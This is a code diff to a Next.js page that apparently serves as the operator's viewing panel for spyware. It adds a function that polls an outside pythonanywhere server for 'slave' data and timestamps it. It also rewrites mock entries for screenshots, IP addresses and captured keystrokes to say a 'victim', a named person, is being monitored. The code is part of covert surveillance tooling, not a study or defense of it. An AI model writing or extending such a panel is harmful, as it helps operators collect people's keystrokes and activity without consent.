@@ -4,24 +4,36 @@ import React, { useState, useEffect } from "react"
 import Head from "next/head"
 import Image from "next/image"
 import Navbar from "../components/ui/navbar"
+import axios from "axios"
+
+async function receiveData() {
+  try {
+      const response = await axios.get('http://swadheenmishra123.pythonanywhere.com/send_data?Type=slave')
+      response.data['timestamp'] = new Date(Date.now()).toISOString()
+      return response.data
+  }
+  catch (error) {
+      console.error(error)
+  }
+}
 
 // Mock data for demonstration - in a real app, this would come from an external source
 const initialMessages = [
   {
     data: "/images/logo.png",
-    response: "System initialized. Monitoring active.",
+    response: "System initialized (sorta). Monitoring da victim... for now.",
     timestamp: new Date(Date.now() - 3600000).toISOString(),
     type: "image",
   },
   {
     data: "192.168.1.1",
-    response: "Connection established from this address.",
+    response: "Connection established with alecc pindey.",
     timestamp: new Date(Date.now() - 1800000).toISOString(),
     type: "ip",
   },
   {
-    data: ["KeyA", "KeyB", "KeyC"],
-    response: "Input sequence detected.",
+    data: ["A", "B", "C"],
+    response: "jus received some inputs.",
     timestamp: new Date(Date.now() - 900000).toISOString(),
     type: "keys",
   },
@@ -74,7 +86,7 @@ export default function DataPage() {
       }
 
       setMessages((prev) => [...prev, newMessage])
-    }, 5000) // New message every 5 seconds
+    }, 7000) // New message every 5 seconds
 
     return () => clearInterval(messageTimer)
   }, [])
